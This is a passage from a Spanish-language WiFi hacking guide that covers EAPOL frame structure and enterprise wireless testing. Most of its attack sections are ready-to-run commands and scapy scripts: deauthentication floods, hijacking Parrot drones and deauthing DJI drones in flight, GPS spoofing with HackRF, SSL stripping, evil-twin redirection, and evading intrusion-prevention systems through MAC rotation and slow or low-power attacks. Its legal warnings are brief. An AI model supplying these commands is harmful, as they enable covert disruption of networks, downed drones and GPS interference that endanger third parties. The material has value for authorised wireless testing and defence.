iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

# Mejor usar mitmproxy o bettercap que hacen SSLstrip automático
bettercap -eval "set http.proxy.sslstrip true; http.proxy on"
```

---

## EAPOL Frame Analysis

EAPOL (EAP over LAN) es el [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) que transporta el 4-way [handshake](../raw/w1f1-4tt4cks.md#handshake).

### Estructura de Paquete EAPOL

```
Ethernet Header (14 bytes)
├── Dest MAC (6 bytes)
├── Src MAC (6 bytes)
└── EtherType = 0x888E (2 bytes)

EAPOL Frame
├── Protocol Version (1 byte)
├── Packet Type (1 byte)
│   ├── 0x00 = EAP-Packet
│   ├── 0x01 = EAPOL-Start
│   ├── 0x02 = EAPOL-Logoff
│   ├── 0x03 = EAPOL-Key
│   └── 0x04 = EAPOL-Encapsulated-ASF-Alert
├── Packet Body Length (2 bytes)
└── Packet Body (variable)

Para EAPOL-Key (type 0x03):
├── Descriptor Type (1 byte)
├── Key Info (2 bytes)
├── Key Length (2 bytes)
├── Key Replay Counter (8 bytes)
├── Key Nonce (32 bytes)        ← ANonce o SNonce
├── Key IV (16 bytes)
├── Key RSC (8 bytes)
├── Key ID (8 bytes)
├── Key MIC (16 bytes)          ← Esto verificamos
└── Key Data (variable)
    └── WPA Key Data Elements
        ├── PMKID (opcional)    ← Para PMKID attack
        └── Group Cipher, etc.
```

### Análisis con [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark)

```bash
# Capturar solo EAPOL
tcpdump -i wlan0mon -e -s 0 -w handshake.pcap 'ether proto 0x888e'

# En Wireshark:
# Filtrar: eapol
# Message 1: ver ANonce (Key Nonce)
# Message 2: ver SNonce + MIC (Key MIC)
# Message 3: ver GTK
# Message 4: ACK
```

---

## Ataques a Drones/UAV [wifi](../raw/w1f1-4tt4cks.md)

Los drones comerciales usan WiFi para control y transmisión de video. Esto los hace vulnerables a ataques WiFi tradicionales.

### DJI Drone Protocol Analysis

Los drones DJI (Mavic, Phantom, Mini) usan:
- **OcuSync 2.0/3.0**: [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) propietario en 2.4GHz y 5GHz
- **WiFi Direct**: para conexión con el control remoto
- **Transmisión de video**: en bandas de 2.4/5.8GHz con [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)-256

```bash
# Escaneo de drones DJI en el espectro
# Los drones DJI emiten señales características:
# - Saltos de frecuencia rápidos (frequency hopping)
# - Ancho de banda de 20MHz
# - Patrones de modulación específicos

# Con airodump-ng (limitado, solo captura canales fijos)
airodump-ng wlan0mon --band abg

# Mejor con SDR para capturar todo el espectro:
# HackRF + GQRX para visualizar saltos de frecuencia
# Analizar los hops de OcuSync

# DJI WiFi handshake (modo WiFi directo):
# Cuando el control remoto se conecta al dron por WiFi directo
airodump-ng -c 6 --bssid DRON_MAC -w dron_capture wlan0mon
```

#### DJI [deauthentication](../raw/w1f1-4tt4cks.md#deauthentication-attack) Attack

```bash
# Los drones DJI que usan WiFi directo (modelos viejos como Phantom 3)
# son vulnerables a deauth tradicional

# Deauth al dron (pierde conexión con el control)
aireplay-ng -0 5 -a DRON_MAC -c CONTROL_MAC wlan0mon

# Deauth broadcast (desconecta todo)
aireplay-ng -0 10 -a DRON_MAC wlan0mon

# Con mdk4:
mdk4 wlan0mon d -B DRON_MAC -c 6

# Después del deauth:
# - El dron puede entrar en modo failsafe (regresa al punto de despegue)
# - O puede caer (depende del firmware)
# - El video feed se corta

# (ATENCIÓN: desconectar un dron en vuelo puede causar daños/lesiones)
```

#### DJI Video Feed Interception

```bash
# DJI transmite video cifrado con AES-256
# No es factible descifrar en tiempo real
# PERO:
# 1. Drones viejos (Phantom 3 Standard, Spark) usaban transmisión sin cifrar
# 2. Si tenés la clave de cifrado (extraída del control)
# 3. Si el firmware está comprometido

# Capturar feed de video (en redes abiertas):
airodump-ng -c 6 -w video_feed wlan0mon
# Analizar con Wireshark para ver si hay RTSP/RTP sin cifrar
tshark -r video_feed-01.cap -Y "rtp"
# Si ves RTP, podés reconstruir el video
```

#### DJI [gps spoofing](../raw/sp4c3-s3c.md#gps-spoofing)

```bash
# GPS spoofing requiere SDR:
# - HackRF One o similar
# - Transmisión de señales GPS falsas en 1.57542 GHz

# No es estrictamente WiFi, pero se relaciona con drones
# El dron usa GPS para posicionamiento y vuelo autónomo
# Si falsificás la señal GPS, el dron cree que está en otro lugar

# Con gps-sdr-sim:
git clone https://github.com/osqzss/gps-sdr-sim.git
cd gps-sdr-sim
# Generar señal GPS falsa (por ejemplo, Aeroparque)
python gps-sdr-sim.py -e brdc3540.14n -l -34.5583,-58.4167,10 -b 16
# Transmitir con HackRF:
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 20

# ADVERTENCIA: falsificar GPS es ilegal en casi todos los países
# y extremadamente peligroso (interfiere con aviación)
```

### Parrot AR/Bebop WiFi Attacks

Los drones Parrot (AR Drone 2.0, Bebop 1/2) usan WiFi abierto para control. Son mucho más vulnerables.

```bash
# Parrot AR Drone 2.0:
# - Crea su propio AP WiFi: "ardrone2_XXXXXX"
# - Sin contraseña (open network)
# - Protocolo de control: UDP en puertos 5555, 5556, 5557
# - Transmisión de video: RTP en puerto 5555

# Conectarse al dron:
# (El dron crea un AP abierto)
iw dev wlan0 connect "ardrone2_XXXXXX"
ifconfig wlan0 192.168.1.2

# Enviar comandos AT al dron:
echo "AT*REF=1,290717696\r" | nc -u 192.168.1.1 5556
# 290717696 = takeoff
# 290717952 = land
# 290718208 = emergency stop

# Capturar video feed:
ffmpeg -i udp://0.0.0.0:5555 -vcodec copy output.mp4

# Interceptar entre control y dron:
# 1. Deautenticar al control legítimo
aireplay-ng -0 5 -a DRON_MAC -c CONTROL_MAC wlan0mon
# 2. Conectarse al dron
# 3. Tomar control

# Parrot Bebop:
# - WiFi protected (WPA2, contraseña en sticker)
# - Protocolo ARSDK (más seguro que AR Drone)
# - Video streaming cifrado (pero algunos modelos no)
# - Puerto 44444 para control

# Bebop Deauth + Evil Twin:
# 1. Capturar handshake del Bebop
# 2. Crakear contraseña WPA2
# 3. Conectarse como control
```

### DJI Signal Jamming (Consideraciones Legales)

```bash
# Jamming de señal WiFi es ILEGAL en absolutamente todos los países
# Incluso para pentesters autorizados, el jamming requiere
# autorización especial del ente regulador (ENACOM en Argentina, FCC en USA)

# Por qué:
# - Interfiere con comunicaciones legítimas
# - Puede afectar redes WiFi de terceros
# - En bandas compartidas con radar/aviación, es peligroso

# Alternativas LEGALES:
# - Deauthentication (es SPECÍFICO, no jamming)
# - Channel blacklisting
# - Bloqueo selectivo de clientes

# NUNCA USAR:
# - WiFi jammers (completamente ilegales)
# - Signal blockers
# - RF jammers de banda ancha
```

---

## Enterprise Wireless Security Testing

### WIPS/WIDS Detection y Evasión

Los sistemas WIPS (Wireless Intrusion Prevention System) y WIDS (Wireless Intrusion Detection System) monitorean el espectro [wifi](../raw/w1f1-4tt4cks.md) para detectar ataques.

```bash
# ¿Qué detecta un WIPS?
# - Deauthentication attacks (rate de deauths anormal)
# - Evil Twin APs (por fingerprint de AP)
# - KARMA attacks (respuestas a probes)
# - Rogue APs (APs no autorizados)
# - Client misassociation
# - Channel hopping anormal
# - MAC spoofing
# - Brute force WPS
# - PMKID collection (tasas altas de association)

# Ejemplos comerciales:
# - Cisco CMX / DNA Spaces
# - Aruba AirWave / WIPs
# - Extreme Networks AirDefense
# - Fortinet FortiWIPS
# - WatchGuard WIPS
# - Open Source: Kismet + Snort/Suricata
```

#### Evadiendo WIPS

```bash
# Técnicas para evadir WIPS:

# 1. Ataque lento (Slow Attack)
# Reducir velocidad de deauth: 1 paquete cada 2-5 segundos
# En lugar de 10 deauths en 1 segundo, mandá 1 cada 10 segundos
# El WIPS no detecta un rate de ataque si es similar al tráfico normal

for i in {1..50}; do
  aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0mon
  sleep $((RANDOM % 10 + 5))
done

# 2. MAC Rotation
# Cambiar MAC del atacante cada N paquetes
while true; do
  ifconfig wlan0mon down
  macchanger -r wlan0mon
  ifconfig wlan0mon up
  sleep 2
  aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF wlan0mon
  sleep $((RANDOM % 20 + 10))
done

# 3. Ataque distribuido
# Usar múltiples adaptadores con diferentes MACs
# Cada adaptador manda pocos deauths
# El WIPS ve ataques desde diferentes fuentes

# 4. Timing basado en tráfico legítimo
# Solo atacar cuando hay tráfico legítimo en la red
# El deauth se "pierde" entre el ruido normal

# 5. Ataque en canales DFS
# Muchos WIPS no monitorean canales DFS continuamente
# Usá canales 52-64 o 100-140 para ataques

# 6. Modulación de potencia
# Empezá con baja potencia (el WIPS ve señal débil)
# Aumentá potencia gradualmente
# El WIPS no detecta el ataque como amenaza hasta que es tarde
```

#### Detectar WIPS

```bash
# Antes de atacar, verificá si hay WIPS:
# 1. Escaneá con airodump-ng en modo pasivo
# 2. Mandá un deauth de prueba
# 3. Monitoreá si el AP toma acciones de mitigación
#    (cambia de canal, baja potencia, desconecta clientes sospechosos)

# Si el AP responde al deauth con:
# - Channel switch announcement (cambia de canal)
# - Disassociation con código específico
# - Rate limiting de asociaciones
# -> Probablemente hay WIPS

# Escuchar alertas WIPS (si tenés acceso a la red cableada):
# Los WIPS corporativos envían SNMP traps, logs a SIEM
# Capturá tráfico del segmento de management
tcpdump -i eth0 -w wips_alerts.pcap 'port 162'  # SNMP traps
```

### 802.11w — Management Frame Protection (MFP)

802.11w protege los management frames ([deauthentication](../raw/w1f1-4tt4cks.md#deauthentication-attack), Disassociation, Action frames) contra spoofing.

```bash
# ¿Qué protege 802.11w?
# - Deauthentication frames (protegidos con MIC)
# - Disassociation frames (protegidos con MIC)
# - Action frames (medidas de canal, etc.)
# - Beacon frames NO están protegidos
# - Probe Response NO está protegido

# ¿Cómo detectar si un AP usa MFP?
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w ap_info
# En Wireshark:
# Beacon -> RSN -> Capabilities:
# Bit 14: Management Frame Protection Required (obligatorio)
# Bit 15: Management Frame Protection Capable (opcional)
# Si Required = 1, no podés hacer deauth sin MIC

# O con iw:
iw dev wlan0mon scan | grep -A20 "AA:BB:CC:DD:EE:FF" | grep -A5 "RSN"
# Buscá "Management Frame Protection"
```

#### Bypass de 802.11w

```bash
# Técnica 1: Ataque al cliente (no al AP)
# 802.11w no es obligatorio en clientes viejos
# Un cliente sin MFP ignora las protecciones
# Mandás deauth directamente al cliente (con DA = CLIENT_MAC)
aireplay-ng -0 5 -a AP_MAC -c CLIENT_SIN_PMF wlan0mon

# Técnica 2: Beacon flood + deauth combinado
# Aunque no podés deautenticar un cliente con MFP,
# podés confundirlo con un beacon flood masivo
# El cliente se desasocia por saturación de beacons falsos

# Técnica 3: Ataque a la clave de grupo (GTK)
# 802.11w usa BIP (Broadcast Integrity Protocol)
# Para firmar management frames broadcast
# Si capturás el IGTK (Integrity GTK), podés firmar deauths falsos
# El IGTK se transmite en el 4-way handshake (M3) cifrado
# Lo extraés si tenés la PMK

# Técnica 4: Channel switch announcement
# Mandás un Action Frame con Channel Switch Announcement
# El cliente cambia a un canal que no existe
# (Los Action frames están protegidos PERO algunos clientes
#  procesan el anuncio antes de verificar la firma)
```

### 802.11r — Fast Roaming (FT) Attacks

802.11r (Fast Roaming / Fast BSS Transition) permite roaming rápido usando claves derivadas previamente. Esto introduce vulnerabilidades.

```bash
# FT over DS (Distribution System)
# Usa claves de roaming que se pueden derivar sin autenticación completa
# El atacante puede:
# 1. Capturar el MDIE (Mobility Domain IE) del beacon
# 2. Derivar PMK-R0 y PMK-R1 usando el R0KH-ID y R1KH-ID
# 3. Forjar un FT Association Request y autenticarse sin conocer la PSK

# Detectar FT:
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w ft_info
# En Wireshark, buscá "Mobility Domain IE" en el beacon
# También "FT Capabilities"

# Herramienta: wpa_supplicant con FT
# Configurar para FT:
cat > ft_client.conf << EOF
network={
    ssid="RedCorp"
    key_mgmt=FT-PSK
    psk="la_clave_secreta"
    proto=RSN
    pairwise=CCMP
    group=CCMP
}
EOF

# Si la implementación FT tiene bugs (raro pero pasa):
# - Replay de FT authentication
# - Reventar claves FT por PMKID conocido
# - FT resource exhaustion (loguear muchos FT clients)
```

### 802.11k y 802.11v — RRM Attacks

802.11k (Radio Resource Management) y 802.11v (Wireless Network Management) proveen información detallada del entorno radioeléctrico.

```bash
# 802.11k Neighbor Reports
# El AP le dice al cliente qué otros APs están cerca
# El atacante puede falsificar estos reports para:
# - Redirigir clientes a un AP falso
# - Forzar roaming a un canal congestionado
# - Revelar información de APs vecinos

# Detectar 802.11k:
iw dev wlan0mon scan | grep "RM Enabled Capabilities"

# 802.11v BSS Transition Management
# El AP puede ordenar a un cliente que se mueva a otro AP
# El atacante puede:
# - Forzar desconexiones (es como un deauth pero más elegante)
# - Redirigir clientes a un AP falso
# - Manipular la preferencia de banda (2.4 vs 5GHz)

# Forzar un cliente a conectarse a tu AP falso:
# 1. Configurás tu AP falso con el mismo SSID
# 2. Falsificás un BSS Transition Management desde el AP real
# 3. El cliente se desconecta del AP real
# 4. El cliente busca reconectarse, encuentra tu AP falso
# 5. Se conecta al falso

# Con scapy (concepto):
# Necesitás la MAC del AP real y del cliente
# Mandás un Action Frame con BSS Transition Request
# El campo "Candidate List" apunta a tu AP falso
```

### Enterprise Wireless Scanning

```bash
# Escaneo enterprise: buscar redes con 802.1X
airodump-ng wlan0mon --band abg -w enterprise_scan

# Identificar métodos EAP:
# En Wireshark, buscá:
# - "EAP" (todos los paquetes EAP)
# - "RADIUS" (si lográs capturar tráfico del servidor)
# - "EAP-TLS" (certificados)
# - "EAP-PEAP" (PEAP inner methods)

# Escaneo de SSID ocultos:
airodump-ng wlan0mon --band abg
# Los SSID ocultos aparecen como "SSID: <length: 0>"
# Para revelarlos:
mdk4 wlan0mon p -c 6 -e ""  # Probe request con SSID vacío
# Algunos APs responden con el SSID real

# Herramienta: Kismet para escaneo pasivo enterprise:
kismet -c wlan0mon
# Kismet identifica:
# - WPA Enterprise (vs PSK)
# - Hotspot 2.0
# - Capabilities específicas
```

### Rogue AP Detection — Cómo Detectan Empresas

```bash
# Las empresas WIPS detectan rogue APs por:
# 1. Fingerprinting de firmware (TOS/DHCP options)
# 2. Timing analysis (hostapd tiene fingerprinteable timing)
# 3. BSSID vs OUI analysis
# 4. Channel anomaly
# 5. Signal strength anomaly
# 6. SSID + BSSID mismatch
# 7. Beacon timing (hostapd manda beacons cada 102.4ms exactos)

# Cómo evitar ser detectado:
# 1. Usar adaptador con OUI real (no genérico)
# 2. Ajustar intervalo de beacon a 100ms +/- jitter
# 3. Emular los tiempos de respuesta del AP real
# 4. Usar el mismo canal que el AP legítimo
# 5. No usar hostapd vanilla — usá OpenWRT o driver modificado
# 6. Rotar MAC si el WIPS empieza a sospechar
```

---

## Automatización con Herramientas Todo-en-Uno

### Wifite

```bash
# El más simple
wifite

# Solo WPA/WPA2
wifite --wpa

# Solo WPS
wifite --wps --pixie

# Sin WEP
wifite --no-wep

# Con 5GHz
wifite -5

# Ataque PMKID
wifite --pmkid

# Salida detallada
wifite -v

# Escaneo silencioso (solo pasivo)
wifite --passive
```

### Airgeddon

Menú interactivo en Bash que integra TODO:

```bash
# Descargar e iniciar
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
./airgeddon.sh

# Opciones del menú:
# 1. Evil Twin (con hostapd)
# 2. WPA/WPA2 handshake capture
# 3. WPS attacks (Pixie Dust, PIN)
# 4. DoS attacks
# 5. WEP
# 6. WPA3
# 7. PMKID
# 8. WPA2 Enterprise
```

### [bettercap](../raw/m1tm-m0b1l3.md#bettercap) (consola interactiva)

```bash
bettercap -eval "set wifi.interface wlan0mon; wifi.recon on"
# Capabilities completas:
# - Channel hopping
# - Deauth detection
# - WPA handshake capture
# - PMKID capture
# - Evil Twin
# - KARMA
# - Probe sniffing
```

---

## Desautenticación (Deauth Attack) — Técnicas Avanzadas

### Fundamentos

El deauth attack manda un Management Frame falso (tipo 0, subtipo 12 = 0x0C) que parece venir del AP, diciéndole al cliente que se desconecte. El estándar 802.11 original no protege estos frames, así que cualquier dispositivo puede mandarlos.

### Técnicas de Deauth

```bash
# Básico (aireplay-ng) — 10 paquetes deauth
aireplay-ng -0 10 -a AP_MAC wlan0mon

# Deauth a cliente específico (más preciso, menos colateral)
aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon

# Deauth continuo (hasta Ctrl+C)
aireplay-ng -0 0 -a AP_MAC wlan0mon

# Con mdk4 (menos detectable)
mdk4 wlan0mon d -B AP_MAC -c 6

# Deauth masivo (toda la red)
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6
mdk4 wlan0mon d -E SSID_TARGET -c 6

# Deauth por ESSID (no necesitás BSSID)
mdk4 wlan0mon d -E "RedObjetivo" -c 6

# Deauth a todos los clientes (broadcast)
aireplay-ng -0 10 -a AP_MAC wlan0mon
# vs
aireplay-ng -0 10 -a AP_MAC -c FF:FF:FF:FF:FF:FF wlan0mon
```

### Reason Codes en Deauth — Análisis Detallado

El frame de deautenticación incluye un "Reason Code" que indica por qué se desconecta. No todos los códigos tienen el mismo efecto:

```bash
# Reason Codes comunes que podés usar:
# 1  = Unspecified (genérico)
# 4  = Disassociated due to inactivity (parece legítimo)
# 5  = AP unable to handle all STAs
# 6  = Class 2 frame received from non-authenticated STA
# 7  = Class 3 frame received from non-associated STA
# 8  = Disassociated because sending STA is leaving BSS
# 9  = STA requesting (not) reassociation
# 10 = Disassociated due to incorrect info
# 17 = BSS transition (el cliente cree que hay roaming)
# 38 = PBCC (code de router Cisco)

# El reason code 17 es interesante porque el cliente piensa
# que el AP lo está redirigiendo a otro AP (roaming)

# Con techtools.py (herramienta personalizada):
# Modificar reason code en aireplay-ng no es fácil
# Mejor usar scapy para reason codes específicos:

python3 << 'EOF'
from scapy.all import *

conf.iface = "wlan0mon"

# Paquete deauth con reason code 17 (BSS transition)
ap_mac = "aa:bb:cc:dd:ee:ff"
client_mac = "00:11:22:33:44:55"

frame = RadioTap() / \
    Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / \
    Dot11Deauth(reason=17)

sendp(frame, iface="wlan0mon", count=10, inter=0.1)
print("Deauth con reason 17 enviado")
EOF

# Reason code 8 (Leaving BSS):
# El AP indica que se va de la red. Algunos clientes
# se reconectan inmediatamente, generando handshake rápido
```

### Deauth con MAC Spoofeada

```bash
# Podés mandar deauth desde una MAC falsa (que no es la del AP real)
# El cliente lo recibe pero lo ignora porque no viene del AP
# Solo funciona si el cliente no verifica la MAC origen

# Pero también podés spoofear la MAC del AP real:
# 1. Ponés tu adaptador en modo monitor con MAC del AP real
macchanger -m AA:BB:CC:DD:EE:FF wlan0mon
# 2. Mandás deauth como si fueras el AP
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# CUIDADO: esto hace que parezca que el AP real está atacando
# Puede generar alertas WIPS y confundir logs
```

### Selective Deauth con Spoofed Client MAC

Mandás un deauth que parece venir del cliente, dirigido al AP. Esto engaña al AP para que desconecte al cliente:

```bash
# El AP recibe un deauth del "cliente" y desconecta al cliente real
# Esto funciona aunque el cliente tenga PMF (porque va al AP)

# Con scapy:
python3 << 'EOF'
from scapy.all import *

conf.iface = "wlan0mon"

ap_mac = "aa:bb:cc:dd:ee:ff"
client_mac = "00:11:22:33:44:55"

# Deauth que PARECE del cliente, dirigido al AP
# addr1 = AP, addr2 = CLIENTE (spoofeado), addr3 = AP
frame = RadioTap() / \
    Dot11(addr1=ap_mac, addr2=client_mac, addr3=ap_mac) / \
    Dot11Deauth(reason=3)

sendp(frame, iface="wlan0mon", count=5, inter=0.5)
print("Deauth del cliente al AP enviado")
EOF
```

### Deauth en WPA3 (Protected Management Frames)

WPA3 exige PMF (Protected Management Frames). No podés mandar deauths falsos a [redes](../raw/r3d3s-f0nd4m3nt0s.md) WPA3 puras a menos que el cliente no soporte PMF.

```bash
# Verificar si el AP tiene PMF REQUIRED (obligatorio)
tshark -r captura.pcap -Y "wlan.rsn.mfpr == 1"

# Si MFPR = 1 (obligatorio), el deauth falso falla
# Si MFPC = 1 (capable) pero no required, clientes viejos
# que no soportan PMF siguen siendo vulnerables

# Estrategia para WPA3:
# 1. Ataque de transición: forzar downgrade a WPA2
# 2. Beacon flooding: saturar al cliente con beacons falsos
# 3. ERP attack: manipular ERP element (más abajo)
# 4. Físico: interferir señal del AP legítimo con ruido RF
```

### Deauth Brute Force Race

Cuando el AP y el cliente tienen PMF pero solo algunos paquetes se protegen:

```bash
# Enviá deauths en RÁFAGA antes de que se establezca PMF
# Durante el handshake inicial, antes del 4-way handshake,
# no hay PMF activo todavía

# Estrategia:
# 1. Apenas el cliente empieza a asociarse (Association Request)
# 2. Inmediatamente mandás cientos de deauths
# 3. El deauth llega antes de que el handshake termine
# 4. El cliente se desconecta (no llegó a establecer PMF)

# Script de race condition:
for i in {1..100}; do
  aireplay-ng -0 1 -a AP_MAC -c CLIENT_MAC wlan0mon &
done
```

### ERP Deauth Attacks

ERP (Extended Rate PHY) es parte del estándar 802.11g. Los "ERP Information Elements" en los beacons pueden ser manipulados para causar desconexiones:

```bash
# El elemento ERP indica: protección contra estaciones legacy
# Si falsificás un beacon con ERP = Non-ERP_Present + Use_Protection,
# los clientes 802.11g se desconectan porque creen que hay
# estaciones 802.11b que interfieren

# Con md4 en modo beacon flood:
# Crear beacons con ERP element falso
# No hay comando directo en mdk4, pero podés hacerlo con scapy:

python3 << 'EOF'
from scapy.all import *

conf.iface = "wlan0mon"
ap_mac = "aa:bb:cc:dd:ee:ff"

# Beacon frame con ERP element malicioso
beacon = RadioTap() / \
    Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / \
    Dot11Beacon(cap="short-preamble+ESS") / \
    Dot11Elt(ID="SSID", info="RedObjetivo") / \
    Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96') / \
    Dot11Elt(ID="DSset", info=b'\x06') / \
    Dot11Elt(ID=42, info=b'\x06')  # ERP Element = NonERP_Present + Use_Protection

sendp(beacon, iface="wlan0mon", count=100, inter=0.01)
EOF
```

### Beacon-Based Deauth

Explota el comportamiento de los clientes: si un cliente recibe un beacon con un SSID que conoce, intenta asociarse. Si el beacon dice que el AP está reiniciándose o cambiando de configuración, el cliente se desconecta:

```bash
# Enviar beacons con BSSID del AP real pero con flags modificados
# El elemento "Quiet" (ID 40) indica que el AP va a estar en silencio
# El cliente se desconecta hasta que termine el "quiet period"

# O el elemento "BSS Load" (ID 11) con alta utilización
# Hace que el cliente evite conectarse o se desconecte

# Con scapy, beacon con BSS Load alto:
python3 << 'EOF'
from scapy.all import *

conf.iface = "wlan0mon"
ap_mac = "aa:bb:cc:dd:ee:ff"

# BSS Load: 100% utilization (station count = 255, channel utilization = 255)
bss_load = Dot11Elt(ID=11, info=b'\xff\xff\xff\xff\xff')

beacon = RadioTap() / \
    Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / \
    Dot11Beacon(cap="short-preamble+ESS") / \
    Dot11Elt(ID="SSID", info="RedObjetivo") / \
    Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96') / \
    Dot11Elt(ID="DSset", info=b'\x06') / \
    bss_load

sendp(beacon, iface="wlan0mon", count=500, inter=0.001)
EOF
```

### Deauth con Diferentes Potencias

```bash
# Empezá con baja potencia para que el deauth llegue JUSTO al cliente
# Aumentá gradualmente para que el AP no registre el ataque
# Técnica "Stealth Deauth":

# 1. Primero, calibrá la potencia mínima necesaria:
iw dev wlan0mon set txpower fixed 500   # 5 dBm (muy baja)
aireplay-ng -0 1 -a AP_MAC -c CLIENT_MAC wlan0mon

# 2. Si no funciona, aumentá de a 5 dBm:
iw dev wlan0mon set txpower fixed 1000  # 10 dBm
aireplay-ng -0 1 -a AP_MAC -c CLIENT_MAC wlan0mon

# 3. Hasta que funcione. Usá la MÍNIMA potencia necesaria.
iw dev wlan0mon set txpower fixed 2000  # 20 dBm
```

---

## Beacon Flood — Saturación de APs Falsos

```bash
# Beacon flood básico (APs con nombres aleatorios)
mdk4 wlan0mon b -c 6

# Beacon flood con nombres de una wordlist
mdk4 wlan0mon b -c 6 -w /usr/share/wordlists/rockyou.txt

# Beacon flood con SSID específico
mdk4 wlan0mon b -c 6 -n "RedGratis"

# Beacon flood + deauth simultáneo
mdk4 wlan0mon b -c 6 &
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF &
```

---

## Wardriving y GPS Mapping

```bash
# Wardriving con kismet + GPS
kismet -c wlan0mon --gps :2947  # GPSD en puerto 2947

# Guardar resultados
# Kismet guarda .kismet, .gps, .pcap

# Wardriving con Wigle (Android app)
# 1. Instalar Wigle Wifi en celular
# 2. Activar GPS + WiFi scanning
# 3. Subir a wigle.net

# Convertir a formato Wigle CSV
kismet2wigle.py kismet_file.kismet -o wigle_upload.csv

# Ver mapa en wigle.net
# https://wigle.net
```

---

## MIMO, Frame Aggregation y Problemas Técnicos

### MIMO (Multiple Input Multiple Output)

Los routers modernos usan múltiples antenas (2×2, 3×3, 4×4). Esto complica la inyección porque:

- El beamforming hace que ciertos paquetes no lleguen a todos los puntos
- La señal es direccional
- Para ataques, a veces conviene deshabilitar MIMO:

```bash
iw dev wlan0mon set bitrates legacy-2.4 11  # Forzar 11Mbps (no MIMO)
iw dev wlan0mon set bitrates legacy-5 6     # 6Mbps en 5GHz
```

### Frame Aggregation (A-MSDU, A-MPDU)

Los routers modernos agrupan frames para eficiencia. Algunas herramientas viejas de inyección no soportan esto y los paquetes son ignorados.

Solución: deshabilitar aggregation en el [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers)

```bash
# Para iwlwifi (Intel)
echo "Y" > /sys/kernel/debug/ieee80211/phy0/iwlwifi/disable_11n
```

### Airtime Fairness

Algoritmo que da tiempo de transmisión equitativo a cada cliente. En [redes](../raw/r3d3s-f0nd4m3nt0s.md) muy cargadas, puede hacer que la inyección sea más lenta. No hay mucho que hacer, pero ayuda estar cerca del objetivo.

---

## 2.4GHz vs 5GHz — Diferencias Prácticas

| Aspecto | 2.4 GHz | 5 GHz |
|---------|---------|-------|
| Canales | 1-14 (solo 3 no solapados) | 36-165 (muchos canales) |
| Alcance | Mayor (atraviesa paredes) | Menor |
| Velocidad | Hasta 600 Mbps (teórico) | Hasta 6.9 Gbps (teórico) |
| Monitoreo | Fácil, menos canales | Más canales, más lento de escanear |
| Inyección | Generalmente funciona bien | Algunos drivers fallan |
| Herramientas | Todas soportan | Algunas tienen bugs |
| Congestión | Muy congestionado (muchos dispositivos) | Menos congestionado |

### Recomendaciones para 5GHz

```bash
# Asegurate de que el adaptador soporte 5GHz
iw phy phy0 info | grep -E "5180|5745"

# Canales 5GHz comunes en Argentina/USA
# Canales UNII-1: 36, 40, 44, 48 (indoor)
# Canales UNII-3: 149, 153, 157, 161, 165 (indoor/outdoor)

# Escanear 5GHz específico
airodump-ng --band a wlan0mon
airodump-ng -c 36,40,44,48,149,153,157,161,165 wlan0mon
```

### DFS Canales (Radar Detection)

Algunos canales 5GHz se comparten con radares meteorológicos. El [wifi](../raw/w1f1-4tt4cks.md) tiene que escuchar 60 segundos antes de usarlos para detectar radar. Esto complica los ataques:

```bash
# Verificar si un canal es DFS
iw reg get
# DFS: los canales marcados como "radar detection"

# No podés fijar un canal DFS manualmente si no se completó el CAC
iw dev wlan0mon set channel 52   # ERROR si no pasó CAC
```

---

## Consideraciones Legales por País

| País | Marco Legal | Penas |
|------|-------------|-------|
| Argentina | Ley 26.904 (Delitos Informáticos) | Prisión 1-6 años |
| España | Ley Orgánica 10/1995 + Reformas | Prisión 6 meses-4 años |
| México | Código Penal Federal | Prisión 6 meses-6 años |
| Colombia | Ley 1273 de 2009 | Prisión 4-8 años |
| USA | Computer Fraud and Abuse Act | Multas + prisión |
| UK | Computer Misuse Act 1990 | Hasta 10 años |

**Regla de oro**: solo atacá [redes](../raw/r3d3s-f0nd4m3nt0s.md) que sean tuyas o que tengas autorización por escrito. En un pentest profesional, el alcance está definido en un contrato.

---

## RF Hardware y Antenas — Guía Completa

### Fundamentos de Antenas para [wifi](../raw/w1f1-4tt4cks.md) Hacking

La antena es el componente más importante para el alcance. No importa si tenés la placa WiFi más cara del mundo, si la antena es una poronga no llegás ni a la esquina.

### Tipos de Antenas — Análisis Técnico

| Antena | Ganancia | Patrón | Ancho de haz | Uso óptimo |
|--------|----------|--------|:---:|-----------|
| Omnidireccional | 2-9 dBi | Circular | 360° horizontal, ~30-60° vertical | Wardriving, escaneo general, monitoreo |
| Panel (plana) | 10-24 dBi | Direccional | 30-60° | Ataques a larga distancia, punto a punto |
| Yagi | 10-20 dBi | Muy direccional | 10-30° | Punto a punto específico |
| Patch | 6-12 dBi | Semidireccional | 60-90° | Vehículos, instalaciones fijas |
| Parabólica/Sectorial | 20-30 dBi | Extremadamente direccional | 5-15° | Distancias extremas (>5km) |
| Parabólica rejilla | 24-34 dBi | Láser-like | <10° | Enlaces punto a punto |
| Cantenna (lata) | 8-15 dBi | Direccional | 30-60° | DIY, casero, muy barato |

#### Omnidireccionales

Las antenas omnidireccionales irradian en 360° alrededor del eje vertical. La ganancia se logra comprimiendo el lóbulo vertical:

```
Antena 2dBi: patrón casi esférico (similar a un globo)
  - Corto alcance, buen ángulo vertical
  - No importa cómo la orientes

Antena 9dBi: patrón tipo donut achatado
